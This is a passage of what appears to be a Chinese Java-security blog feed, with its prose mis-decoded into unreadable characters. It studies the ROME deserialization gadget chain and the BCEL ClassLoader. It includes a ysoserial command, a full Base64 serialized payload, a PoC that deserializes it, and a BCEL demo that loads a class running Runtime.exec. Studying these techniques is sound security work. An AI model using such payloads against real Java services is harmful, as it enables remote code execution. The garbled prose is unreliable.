class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªdemoæ¥è¿›è¡Œè§¦å‘æ¼æ´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64_exp</span> <span class="operator">=</span> <span class="string">&quot;BASE64_STRING&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] exp =  Base64.getDecoder().decode(base64_exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>ysoserial</code>ç”Ÿæˆå¼¹è®¡ç®—å™¨çš„<code>payload</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME <span class="string">&#x27;calc&#x27;</span>|base64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEABGNhbGMIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBACB5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MQEAIkx5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB+AB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB+ACNxAH4ADXEAfgAGcQB+AAZxAH4ABng=</span><br></pre></td></tr></table></figure><p>ç„¶åæ”¾å…¥Poc.javaé‡Œçš„string    ç„¶åè¿›è¡Œè¿è¡Œå°±å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨äº†</p><p><img src="../images/image-20230427213256355.png" alt="image-20230427213256355"></p><p>ç°åœ¨å¯ä»¥å¯¹è¿™æ¡é“¾å­è¿›è¡Œåˆ†æ</p><h3 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h3><p>è€æ ·å­æˆ‘ä»¬å…ˆå»<code>ysoserial</code>ä¸­çœ‹ä¸€ä¸‹è°ƒç”¨é“¾çš„é¡ºåº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">* NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* Method.invoke(Object, Object...)</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line"></span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>è€ŒROMEæ¼æ´çš„å…³é”®ä¹‹ä¸€å°±æ˜¯<code>ToStringBean.toString()</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> javaååºåˆ—åŒ–-Rome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹BCEL ClassLoader</title>
      <link href="/posts/30ead299.html"/>
      <url>/posts/30ead299.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">å‚è€ƒæ–‡ç« </a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>BCELå¹³å¸¸åœ¨æµ‹è¯•ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿç»å¸¸ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚å»¶æ—¶æµ‹Gadgetä»¥åŠåœ¨æŸäº›åœºæ™¯ä¸‹æ‰§è¡Œå‘½ä»¤ä¸æ˜¯é‚£ä¹ˆé¡ºæ‰‹çš„æƒ…å†µä¸‹é€‰æ‹©BCELå»æ‰“å†…å­˜é©¬ï¼Œå°±åƒFastjsonå’ŒThymeleaf SSTIè¿™ç§ã€‚ä»¥å‰ä¹Ÿåªæ˜¯ç”¨åˆ°è¿™ä¸ªBCELä½†æ˜¯æ²¡æœ‰ä»”ç»†å­¦ä¹ è¿‡ï¼Œä¸‹é¢ç®€å•å­¦ä¹ è®°å½•ä¸‹BCELã€‚</p><h1 id="Javaå®‰å…¨ä¹‹BCEL-ClassLoader"><a href="#Javaå®‰å…¨ä¹‹BCEL-ClassLoader" class="headerlink" title="Javaå®‰å…¨ä¹‹BCEL ClassLoader"></a>Javaå®‰å…¨ä¹‹BCEL ClassLoader</h1><p>ç›®å½•</p><ul><li>Javaå®‰å…¨ä¹‹BCEL ClassLoader<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#å†™åœ¨å‰é¢">å†™åœ¨å‰é¢</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">About BCEL</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#è°ƒè¯•åˆ†æ">è°ƒè¯•åˆ†æ</a></li><li>é£Ÿç”¨å§¿åŠ¿<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fuzzååºåˆ—åŒ–gadget">Fuzzååºåˆ—åŒ–Gadget</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fastjson-bcel-payload">Fastjson BCEL Payload</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#thymeleaf-ssti-payload">Thymeleaf SSTI Payload</a></li></ul></li></ul></li></ul><h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢#"></a>å†™åœ¨å‰é¢<a href="https://www.cnblogs.com/CoLo/p/15869871.html#å†™åœ¨å‰é¢">#</a></h2><p>BCELå¹³å¸¸åœ¨æµ‹è¯•ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿç»å¸¸ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚å»¶æ—¶æµ‹Gadgetä»¥åŠåœ¨æŸäº›åœºæ™¯ä¸‹æ‰§è¡Œå‘½ä»¤ä¸æ˜¯é‚£ä¹ˆé¡ºæ‰‹çš„æƒ…å†µä¸‹é€‰æ‹©BCELå»æ‰“å†…å­˜é©¬ï¼Œå°±åƒFastjsonå’ŒThymeleaf SSTIè¿™ç§ã€‚ä»¥å‰ä¹Ÿåªæ˜¯ç”¨åˆ°è¿™ä¸ªBCELä½†æ˜¯æ²¡æœ‰ä»”ç»†å­¦ä¹ è¿‡ï¼Œä¸‹é¢ç®€å•å­¦ä¹ è®°å½•ä¸‹BCELã€‚</p><h2 id="About-BCEL"><a href="#About-BCEL" class="headerlink" title="About BCEL"></a>About BCEL</h2><p>BCEL Classloaderåœ¨ JDK &lt; 8u251ä¹‹å‰æ˜¯åœ¨rt.jaré‡Œé¢ã€‚<br>åŒæ—¶åœ¨Tomcatä¸­ä¹Ÿä¼šå­˜åœ¨ç›¸å…³çš„ä¾èµ–<br>tomcat7</p><p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>tomcat8åŠå…¶ä»¥å</p><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>è€Œåœ¨<code>rt.jar!/com/sun/org/apache/bcel/internal/util/</code>åŒ…ä¸‹ï¼Œæœ‰<code>Classloader</code>è¿™ä¹ˆä¸€ä¸ªç±»ï¼Œå¯ä»¥å®ç°åŠ è½½å­—èŠ‚ç å¹¶åˆå§‹åŒ–ä¸€ä¸ªç±»çš„åŠŸèƒ½ï¼Œè¯¥ç±»ä¹Ÿæ˜¯ä¸ªClassloaderï¼ˆç»§æ‰¿äº†åŸç”Ÿçš„Classloaderç±»ï¼‰é‡å†™äº†<code>loadClass()</code>æ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šåˆ¤æ–­ç±»åæ˜¯å¦ä»¥$$$BCEL$$$å¼€å¤´ï¼Œä¹‹åè°ƒç”¨<code>createClass()</code>æ–¹æ³•æ‹¿åˆ°ä¸€ä¸ª<code>JavaClass</code>å¯¹è±¡æœ€ç»ˆé€šè¿‡<code>defineClass()</code>åŠ è½½å­—èŠ‚ç è¿˜åŸç±»ã€‚</p><h2 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h2><p>å…ˆæ¥çœ‹ä¸‹ç®€å•çš„ä½¿ç”¨ï¼Œåœ¨åŒä¸€åŒ…ä¸‹ï¼Œå‡†å¤‡ä¸€ä¸ªæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡†å¤‡ä¸€ä¸ªBCELçš„demo,è¿è¡Œå³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">         <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">         <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">         System.out.println(code);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425210508013.png" alt="image-20230425210508013"></p><p>è¿™æ ·å°±æˆåŠŸå¼¹å…¶è®¡ç®—å™¨äº†</p><p>è¿›å…¥loadClass(),é¦–å…ˆä¼šåˆ¤æ–­ç±»åæ˜¯å¦ä»¥$$$BCEL$$$å¼€å¤´ï¼Œä¹‹åè°ƒç”¨<code>createClass()</code>æ–¹æ³•æ‹¿åˆ°ä¸€ä¸ª<code>JavaClass</code>å¯¹è±¡æœ€ç»ˆé€šè¿‡<code>defineClass()</code>åŠ è½½å­—èŠ‚ç è¿˜åŸç±»ã€‚</p><p><strong>è¿™é‡ŒåŸå› å°±æ˜¯åˆšå¼€å§‹å¯¹loadClassçš„åˆ†æ</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±è¿›è¡Œæ–­ç‚¹è°ƒè¯•è·Ÿä¸€ä¸‹</p><p><img src="../images/image-20230425211759344.png" alt="image-20230425211759344"></p><p>è¿™é‡Œç”±äºæˆ‘ä»¬å‰é¢ç»™æ–‡ä»¶å¤´åŠ äº†ä¸ªBCElå­—èŠ‚ç ï¼Œäºæ˜¯è¿™é‡Œå°±å¯ä»¥è¿›å…¥createClass()</p><p><strong>createClassæºç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">  <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    clazz = parser.parse();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">  <span class="type">ConstantPool</span> <span 